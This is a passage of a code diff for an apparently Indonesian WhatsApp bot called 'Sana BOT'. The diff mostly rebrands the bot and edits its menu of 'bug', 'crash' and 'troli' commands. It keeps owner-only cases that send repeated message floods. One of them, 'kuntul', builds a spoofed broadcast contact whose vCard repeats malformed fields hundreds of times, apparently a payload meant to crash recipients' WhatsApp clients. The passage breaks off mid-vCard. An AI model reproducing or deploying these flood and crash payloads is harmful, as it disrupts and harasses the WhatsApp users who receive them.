+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -5146,39 +5270,6 @@ need help?, bot report broken or not working?
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
-███████████████████████████████
-████╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬████
-██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
-█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
-█╬╬╬███████╬╬╬╬╬╬╬╬╬███████╬╬╬█
-█╬╬██╬╬╬╬███╬╬╬╬╬╬╬███╬╬╬╬██╬╬█
-█╬██╬╬╬╬╬╬╬██╬╬╬╬╬██╬╬╬╬╬╬╬██╬█
-█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
-█╬╬╬╬█████╬╬╬╬╬╬╬╬╬╬╬█████╬╬╬╬█
-█╬╬█████████╬╬╬╬╬╬╬█████████╬╬█
-█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
-█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
-█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
-█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
-█╬╬╬▓▓▓▓╬╬╬╬╬╬╬█╬╬╬╬╬╬╬▓▓▓▓╬╬╬█
-█╬╬▓▓▓▓▓▓╬╬█╬╬╬█╬╬╬█╬╬▓▓▓▓▓▓╬╬█
-█╬╬╬▓▓▓▓╬╬██╬╬╬█╬╬╬██╬╬▓▓▓▓╬╬╬█
-█╬╬╬╬╬╬╬╬██╬╬╬╬█╬╬╬╬██╬╬╬╬╬╬╬╬█
-█╬╬╬╬╬████╬╬╬╬███╬╬╬╬████╬╬╬╬╬█
-█╬╬╬╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬╬╬╬█
-██╬╬█╬╬╬╬╬╬╬╬█████╬╬╬╬╬╬╬╬█╬╬██
-██╬╬██╬╬╬╬╬╬███████╬╬╬╬╬╬██╬╬██
-██╬╬▓███╬╬╬████╬████╬╬╬███▓╬╬██
-███╬╬▓▓███████╬╬╬███████▓▓╬╬███
-███╬╬╬╬▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬███
-████╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬████
-█████╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬█████
-██████╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬██████
-███████╬╬╬╬╬╬╬███╬╬╬╬╬╬╬███████
-████████╬╬╬╬╬╬███╬╬╬╬╬╬████████
-█████████╬╬╬╬╬███╬╬╬╬╬█████████
-███████████╬╬╬╬█╬╬╬╬███████████
-███████████████████████████████
 
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -5193,20 +5284,20 @@ need help?, bot report broken or not working?
 │➳ ${prefix}kislebew
 │➳ ${prefix}kiinfinite
 │➳ ${prefix}kitengkorak
-│➳ ${prefix}kidocu (jumlah)
-│➳ ${prefix}kibug1 (jumlah)
-│➳ ${prefix}kibug2 (jumlah)
-│➳ ${prefix}kibug3 (jumlah)
-│➳ ${prefix}kibug4 (jumlah)
-│➳ ${prefix}kibug5 (jumlah)
-│➳ ${prefix}kibug6 (jumlah)
-│➳ ${prefix}kibug7 (jumlah)
-│➳ ${prefix}kibug8 (jumlah)
-│➳ ${prefix}kibug9 (jumlah)
-│➳ ${prefix}kibug10 (jumlah)
-│➳ ${prefix}kibug11 (jumlah)
-│➳ ${prefix}kibug12 (jumlah)
-│➳ ${prefix}kibugpc (jumlah)
+│➳ ${prefix}29 (jumlah)
+│➳ ${prefix}1 (jumlah)
+│➳ ${prefix}2 (jumlah)
+│➳ ${prefix}3 (jumlah)
+│➳ ${prefix}4 (jumlah)
+│➳ ${prefix}5 (jumlah)
+│➳ ${prefix}6 (jumlah)
+│➳ ${prefix}7 (jumlah)
+│➳ ${prefix}8 (jumlah)
+│➳ ${prefix}9 (jumlah)
+│➳ ${prefix}20 (jumlah)
+│➳ ${prefix}21 (jumlah)
+│➳ ${prefix}22 (jumlah)
+│➳ ${prefix}27 (jumlah)
 │➳ ${prefix}kitrol (jumlah)
 │➳ ${prefix}kitroli (jumlah)
 │➳ ${prefix}kitroliv2 (jumlah)
@@ -5222,8 +5313,8 @@ need help?, bot report broken or not working?
 │➳ ${prefix}kibuglist (jumlah)
 │➳ ${prefix}kitagwae (jumlah)
 │➳ ${prefix}kicatalog (jumlah)
-│➳ ${prefix}kicatalogv2 (jumlah)
-│➳ ${prefix}kibugstik (jumlah)
+│➳ ${prefix}26 (jumlah)
+│➳ ${prefix}28 (jumlah)
 │➳ ${prefix}kithelima (jumlah)
 │➳ ${prefix}crashcok (jumlah)
 │➳ ${prefix}button (jumlah)
@@ -5305,7 +5396,7 @@ need help?, bot report broken or not working?
 ✧ Thank you I hope you can understand it.
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -5329,8 +5420,8 @@ need help?, bot report broken or not working?
                                 }  
                             }, {
                                 quickReplyButton: {
-                                    displayText: 'INSTAGRAM',
-                                    id: 'instagram'
+                                    displayText: 'SEWA BOT YUK',
+                                    id: 'sewabot'
                                 }
                             }]
                          let setbot = db.data.settings[botNumber]
@@ -5346,30 +5437,30 @@ need help?, bot report broken or not working?
                      }
             break
  case 'crashcok':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-kontolu = '``🔥 ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ 🔥``',
-jobotz.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${jobot}`,body: '🔥 ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
+kontolu = '``🔥 ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ 🔥``',
+jobotz.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${jobot}`,body: '🔥 ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
 }
 }
 break
 case 'kuntul': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
 for (let i = 0; i < jumlah; i++) {
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 